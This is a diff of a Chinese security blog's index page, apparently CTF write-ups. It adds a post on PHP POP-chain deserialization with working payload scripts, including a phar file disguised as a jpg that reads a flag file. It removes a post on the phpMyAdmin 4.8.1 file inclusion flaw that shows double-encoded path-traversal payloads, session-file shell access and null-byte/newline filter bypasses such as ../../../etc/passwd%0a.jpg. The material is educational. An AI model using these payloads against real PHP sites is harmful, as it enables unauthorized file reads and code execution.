@@ -139,6 +139,294 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-POP-exercise" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/21/POP-exercise/">POP_exercise</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/21/POP-exercise/" class="archive-article-date">
+  	<time datetime="2020-04-21T07:10:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="POP链构造练习"><a href="#POP链构造练习" class="headerlink" title="POP链构造练习"></a>POP链构造练习</h4><p>之前有篇文章介绍了POP链构造+Phar://伪协议触发反序列化，最近又做了两道题，加深对POP链构造的理解，在这做个记录免得忘了；</p>
+<h4 id="MRCTF–EZPOP"><a href="#MRCTF–EZPOP" class="headerlink" title="MRCTF–EZPOP"></a>MRCTF–EZPOP</h4><p>点进去就是源码（少点套路和脑洞，放源码，它不香吗…）</p>
+<pre><code> &lt;?php
+//flag is in flag.php
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this-&gt;append($this-&gt;var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&apos;index.php&apos;){
+    $this-&gt;source = $file;
+        echo &apos;Welcome to &apos;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }
+
+    public function __wakeup(){
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}
+
+if(isset($_GET[&apos;pop&apos;])){
+    @unserialize($_GET[&apos;pop&apos;]);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+} </code></pre><p>看到魔术方法，想到反序列化。结合题目，自然想到考察POP链构造，分析代码发现：</p>
+<pre><code>class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this-&gt;append($this-&gt;var);
+    }
+}</code></pre><p>在Modifier类里有include(),并且$value可控，可以使用伪协议读源码；想要触发append(),就要触发<strong>invoke()。而触发</strong>invoke()的条件是：当对象作为函数使用时，触发__invoke();寻找触发条件：</p>
+<pre><code> class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}</code></pre><p>在Test类里<strong>get()可以触发</strong>invoke();接下来就是如何触发<strong>get();</strong>get()是访问不存在的成员变量时调用的；</p>
+<pre><code>class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&apos;index.php&apos;){
+    $this-&gt;source = $file;
+        echo &apos;Welcome to &apos;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }</code></pre><p>在Show类<strong>toString()可以触发；那如何触发</strong>toString()呢？当对象被当作字符串处理时就会触发<strong>toString()。发现在Show类</strong>construct()source成员变量可以触发。到这我们的POP链算是有了雏形。接下来整理一下POP链：<br>首先Show类对象a中source成员变量得是一个Show类对象b，这样在<strong>construct()才能触发Show类中的</strong>toString();<br>第二步，Show类对象b的str成员变量得是Test类对象c，这样在<strong>toString()执行时，因为Test类对象，没有source成员变量，所以会执行c中的</strong>get(),此时对象c中的成员变量p应为Modifier类对象，这样才能触发__invoke(),最后触发append()。<br>payload:</p>
+<pre><code>&lt;?php
+class Show{
+    public $source;
+    public $str;
+
+}
+class Test{
+    public $p;
+}
+class Modifier{
+    protected $var=&apos;php://filter/read=convert.base64-encode/resource=flag.php&apos;;
+}
+
+$a=new Show();
+$a1=new Show();
+$b=new Test();
+$c=new Modifier();
+$a-&gt;source=$a1;
+$a1-&gt;str=$b;
+$a1-&gt;str-&gt;p=$c;
+print_r(serialize($a));
+?&gt;</code></pre><p>拿到flag。</p>
+<h4 id="GXYCTF-Simpleupload"><a href="#GXYCTF-Simpleupload" class="headerlink" title="GXYCTF Simpleupload"></a>GXYCTF Simpleupload</h4><p>这道题跟之前讲的那道题考察知识点相同：phar://触发反序列化+POP链构造<br>直接上主要功能源码：</p>
+<pre><code>&lt;?php
+class C1e4r
+{
+public $test;
+public $str;
+public function __construct($name)
+{
+    $this-&gt;str = $name;    
+}
+public function __destruct()
+{
+    $this-&gt;test = $this-&gt;str; //str= new Show()
+    echo $this-&gt;test; //触发 Show::__toString()
+}
+}
+
+class Show
+{  
+public $source;
+public $str;
+public function __construct($file)
+{
+    $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
+    echo $this-&gt;source;
+}
+public function __toString()
+{
+    $content = $this-&gt;str[&apos;str&apos;]-&gt;source;//str[&apos;str&apos;]=new Test(),因为Test()没有source属性，所以触发Test::__get()
+    return $content;
+}
+public function __set($key,$value)
+{
+    $this-&gt;$key = $value;
+}
+public function _show()
+{
+    if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) {
+        die(&apos;hacker!&apos;);
+    } else {
+        highlight_file($this-&gt;source);//phar://伪协议触发
+    }
+
+}
+public function __wakeup()
+{
+    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
+        echo &quot;hacker~&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    }
+}
+}
+class Test
+{
+public $file;
+public $params;
+public function __construct()
+{
+    $this-&gt;params = array();
+}
+public function __get($key)
+{
+    return $this-&gt;get($key); //触发get()
+}
+public function get($key)
+{
+    if(isset($this-&gt;params[$key])) { //params[&apos;source&apos;]=/var/www/html/flag.php     $c-&gt;$params[&apos;source&apos;]=&apos;/var/www/html/flag.php&apos;
+        $value = $this-&gt;params[$key];
+    } else {
+        $value = &quot;index.php&quot;;
+    }
+    return $this-&gt;file_get($value);
+}
+public function file_get($value)
+{
+    $text = base64_encode(file_get_contents($value));  //读取目标文件的
+    return $text;
+}
+}
+?&gt; </code></pre><p>首先得构造、上传一个phar文件(构造反序列化内容，meta-data经序列化后存储在phar文件)<br>分析POP链：<br>有两个文件操作函数file_get_contents()、highlight_file();第二个函数直接把目标文件过滤了，不好利用；尝试利用file_get_contents()<br>看到Test类里面的file_get方法有file_get_contents函数，再往上看file_get是在get方法里面调用的，而get方法是通过触发魔术方法<strong>get()去调用的那么我们怎么去触发</strong>get呢？再回到类Show中看到看到这里思路就很清晰了，只要我们把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<strong>get()了。那么我们如何触发</strong>toString()呢？在看到C1e4r类里面，看到__destruct()刚好有对字符串的输出整个pop链就很清晰了<br>构造Phar文件：</p>
+<pre><code>&lt;?php
+class C1e4r
+{
+    public $test;
+    public $str;
+}
+class Show
+{
+    public $source;
+    public $str;
+}
+class Test
+{
+    public $file;
+    public $params;
+}
+
+$clear=new C1e4r();
+$show=new Show();
+$test=new Test();
+
+$test-&gt;params[&apos;source&apos;]=&apos;/var/www/html/f1ag.php&apos;;
+$show-&gt;str[&apos;str&apos;]=$test;
+$clear-&gt;str=$show;
+$phar = new Phar(&quot;exp.phar&quot;); //.phar文件
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ? &gt;&apos;); //固定的
+$phar-&gt;setMetadata($clear); //触发的头是C1e4r类，所以传入C1e4r对象
+$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点什么生成个签名
+$phar-&gt;stopBuffering();
+?&gt;</code></pre><p>上传时，修改文件名后缀为jpg；<br>再使用phar://去读这个文件（文件名使用md5加密，md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;可以自己伪造）也可以直接在upload目录下看见；触发反序列化，拿到flag；</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">POP,反序列化</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/21/POP-exercise/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-无参RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1145,153 +1433,6 @@ if(!isset($_GET[&apos;host&apos;])) {
 
 
   
-    <article id="post-phpmyadmin4-8-1-任意文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">phpmyadmin4.8.1 任意文件包含漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-04-11T07:18:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞"><a href="#从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞" class="headerlink" title="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞"></a>从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、phpmyadmin4.8.1 代码审计<br>2、文件包含漏洞<br>3、目录遍历漏洞<br>4、利用文件包含漏洞拿shell</p>
-<h5 id="HCTF-WarmUp"><a href="#HCTF-WarmUp" class="headerlink" title="HCTF-WarmUp"></a>HCTF-WarmUp</h5><p>最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。<br>打开页面，得到源码：</p>
-<pre><code>&lt;?php
-highlight_file(__FILE__);
-class emmm
-{
-    public static function checkFile(&amp;$page)
-    {
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 
-        if (! isset($page) || !is_string($page)) {
-            echo &quot;you can&apos;t see it&quot;;
-            return false;
-        }
-
-        if (in_array($page, $whitelist)) {
-            return true;
-        }
-
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-        );         //将$page中?前面的部分截取出来赋值给$_page
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
-
-        $_page = urldecode($page);//因为浏览器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-        );
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
-        echo &quot;you can&apos;t see it&quot;;
-        return false;
-    }
-}
-
-if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
-    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])  ##是字符串
-    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])  ##上面checkfile返回为true
-) {
-    include $_REQUEST[&apos;file&apos;];
-    exit;
-} else {
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-}  
-?&gt;</code></pre><p>通过分析代码，要求：<br>（1）$_REQUEST[‘file’] 不能为空，<br>（2）$_REQUEST[‘file’]是字符串，<br>（3）并且checkFile返回为true，才能包含$_REQUEST[‘file’]<br>突破的要点应该就是checkFile()函数，接下来重点研究一下：<br>要使得checkFile()为True，总共有三条路径：</p>
-<pre><code>if (in_array($page, $whitelist)) {
-    return true;
-}</code></pre><p>直接将变量进入白名单检验，因为没有对$page进行任何处理，所以无法绕过；<br>再看第二条路径：</p>
-<pre><code>$_page = mb_substr(
-       $page,
-       0,
-       mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-   );         //将$page中?前面的部分截取出来赋值给$_page
-   if (in_array($_page, $whitelist)) {
-       return true;
-   }</code></pre><p>mb_substr()是以0为起始位置，第三参数值为长度，切割$page变量，将其赋给$_page；<br>既然是以“?”为分割点，可不可以提前构造“?”使得切割部分可控呢？<br>又因为source.php在白名单列表中，构造payload:</p>
-<pre><code>index.php?source.php?/../../../../../ffflllaaaggg</code></pre><p>但不可行，原因在于；当传入这样的payload后，$page=source.php?/../../../../../ffflllaaaggg,经过mb_substr()分割后的$_page=source.php成功绕过白名单检测；<br>但在文件包含时，实际包含的内容是”include(source.php?../../../../../ffflllaaaggg)”,服务器会将?后的内容当作参数处理，因此无法实现文件包含；第二条路径走不通；<br>看最后一条路：</p>
-<pre><code>$_page = urldecode($page);//因为服务器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-    );
-    if (in_array($_page, $whitelist)) {
-        return true;
-    }</code></pre><p>发现多了一个urldecode()函数；这时可以利用这个函数，在浏览器传入双重url编码的”?”,%253f;因为服务器会自动进行一次url解码，所以此时$page=source.php%3f/../../../../ffflllaaaggg;再经过urldecode()解码后成功绕过白名单；<br>此时文件包含的内容是include(source.php%3f/../../../../../ffflllaaaggg)<br>成功包含目标文件，得到flag；<br>而phpmyadmin4.8.1文件包含漏洞原理与上面分析基本一样；</p>
-<h3 id="利用该漏洞拿shell"><a href="#利用该漏洞拿shell" class="headerlink" title="利用该漏洞拿shell"></a>利用该漏洞拿shell</h3><p>既然该漏洞可以任意包含文件，是不是可以通过对某些文件添加一句话木马，然后调用该文件实现拿shell；这里直接引用某位师傅的博客：<a href="https://www.cnblogs.com/bmjoker/p/9897436.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9897436.html</a> (这次直接使用的BUU上的题目环境，没有本地搭建；导致文件修改后的路径找不到，无法利用shell，下次本地搭建后，再来填坑)<br>填坑：session_id路径应为：/var/lib/php/sessions/sess_id 即可成功拿shell</p>
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>对于小白来说可能并不理解../../../../的作用；<br>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名形如：<a href="http://www.nuanyue.com/getfile=image.jgp" target="_blank" rel="noopener">http://www.nuanyue.com/getfile=image.jgp</a><br>当服务器处理传送过来的image.jpg文件名后，Web应用程序即会自动添加完整路径，形如“d://site/images/image.jpg”，将读取的内容返回给访问者。<br>由于文件名可以任意更改而服务器支持“~/”，“../”等特殊符号的目录回溯，从而使攻击者越权访问或者覆盖敏感数据，如网站的配置文件、系统的核心文件，这样的缺陷被命名为路径遍历漏洞。当我们传入../../../../时，其实就是起到往上一层父目录跳转的作用，最终到达根目录；<br>对于某些waf，可以使用以下方法绕过：<br>(1) 加密参数传递的数据；<br>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。<br>(2) 编码绕过，<br>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。<br>(3) 目录限定绕过；<br>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号”~“来绕过。形如这样的提交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。<br>(4) 绕过文件后缀过滤；<br>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计，文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1442,6 +1583,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">RCE，PHP函数</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">POP,反序列化</a>
               </li>
             
             <div class="clearfix"></div>
